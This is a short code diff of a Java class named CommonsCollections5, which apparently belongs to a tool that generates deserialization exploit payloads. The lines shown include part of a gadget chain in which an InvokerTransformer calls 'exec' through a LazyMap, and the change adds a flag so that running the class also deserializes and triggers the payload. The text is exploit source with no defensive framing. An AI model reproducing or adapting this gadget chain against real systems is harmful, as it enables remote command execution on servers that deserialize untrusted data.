@@ -71,7 +71,6 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 				new InvokerTransformer("exec",
 					new Class[] { String.class }, execArgs),
 				new ConstantTransformer(1) };
-
 		final Map innerMap = new HashMap();
 
 		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
@@ -89,6 +88,7 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 	}
 
 	public static void main(final String[] args) throws Exception {
+	    PayloadRunner.runDeserialize = true;
 		PayloadRunner.run(CommonsCollections5.class, args);
 	}
 
